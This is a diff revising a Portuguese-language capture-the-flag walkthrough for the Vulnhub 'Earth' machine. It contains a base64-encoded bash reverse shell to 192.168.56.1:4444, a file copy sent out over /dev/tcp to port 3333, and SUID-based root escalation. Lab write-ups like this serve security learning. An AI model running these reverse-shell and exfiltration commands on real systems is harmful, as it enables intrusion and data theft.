@@ -1,3 +1,9 @@
+# Earth - Vulnhub
+
+**Autor**: Arthur Pinheiro
+
+**Tags**: DNS Enumeration, Directory Enumeration, 
+
 # Host Discovery
 
 Antes de mais nada, podemos fazer um host discovery com o arp-scan
@@ -317,11 +323,11 @@ Para isso, usaremos o site https://gchq.github.io/CyberChef/
 Lá colocamos os "ingredientes" From Hex e algoritmo XOR.
 A key, usaremos o conteúdo de testdata.txt e estaremos como input todas as mensagens que estão em earth.local até vermos algo que faça sentido e que tenha algum significado.
 
-# Gaining access
+# Initial Access
 
-Uma das mensagens contém o texto *earthclimatechangebad4humans* repetidamente... usaremos isso como senha do admin e *voilá*.
+Uma das mensagens contém o texto *earthclimatechangebad4humans* repetidamente... usaremos isso como senha do admin.
 
-Agora, vem a parte divertida. Poderemos enviar comandos para o servidor remotamente.
+Agora, poderemos enviar comandos para o servidor remotamente.
 Podemos começar com ls
 
 ```bash
@@ -334,7 +340,7 @@ Podemos ver que estamos em /... Agora, podemos dar um find para encontrar arquiv
 find / -name '*.txt'
 ```
 
-Olha que legal. Encontramos a primeira flag desse CTF. /var/earth_web/user_flag.txt
+Encontramos a primeira flag desse CTF. /var/earth_web/user_flag.txt
 
 ```bash
 cat /var/earth_web/user_flag.txt
@@ -343,7 +349,7 @@ cat /var/earth_web/user_flag.txt
 
 ## Reverse shell
 
-O próximo passo agora é tentarmos acesso de root, pois se formos dar um whoami, veremos que somos o usuário apache.
+O próximo passo agora é tentarmos acesso de root.
 Para fazermos isso, precisamos de um reverse shell. Temos algumas opções. Colocarei duas aqui
 
 Primeiramente, para sabermos o bash disponível:
@@ -373,17 +379,19 @@ Para contornar, codificaremos para base64 o nosso comando, ficando assim:
 
 YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxJwo= (Primeira opção)
 
-Sendo assim, copiaremos e colaremos o seguinte no campo de comando do site:
+Sendo assim, executaremos o seguinte no campo de comando do site:
 
+```bash
 echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxJwo=' | base64 -d | bash
+```
 
-e voilá... obtivemos o reverse shell
+Obtivemos o reverse shell
 
 # Privilege Escalation
 
 O próximo passo é procurar uma escalação de privilégio
 
-Primeiro, procuraremos por uma permissão de root em arquivos... De novo, usaremos o comando find para isso.
+Primeiro, procuraremos por uma permissão de root em arquivos.
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
@@ -414,9 +422,8 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/polkit-1/polkit-agent-helper-1
 ```
 
-De todos os arquivos, o **/usr/bin/reset_root** parece mais promissor.
+De todos os arquivos, o **/usr/bin/reset_root** parece ser o correto.
 
-Se dermos um cat nele, não vamos conseguir ler muita coisa, pois é binário.
 Para isso, teremos que mandar uma cópia desse arquivo para a nossa máquina.
 Sendo assim, abriremos outro socket com o netcat em uma outra porta.
 
@@ -424,7 +431,7 @@ Sendo assim, abriremos outro socket com o netcat em uma outra porta.
 nc -lnvp 3333 > reset_root
 ```
 
-na outra aba, temos que enviar o reset_root para a nossa máquina:
+No outro terminal, temos que enviar o reset_root para a nossa máquina:
 
 ```bash
 cat /usr/bin/reset_root > /dev/tcp/192.168.56.1/3333
@@ -468,7 +475,7 @@ touch /tmp/kcM0Wewe
 bash-5.1$ /usr/bin/reset_root
 ```
 
-Como saída, temos algo muito bom:
+Como saída, temos:
 
 ```bash
 bash-5.1$ /usr/bin/reset_root
@@ -477,7 +484,7 @@ CHECKING IF RESET TRIGGERS PRESENT...
 RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
 
 ```
-a senha do root foi resetada. Agora, só precisamos logar como root
+A senha do root foi resetada. Agora, só precisamos logar como root
 
 ```bash
 su root
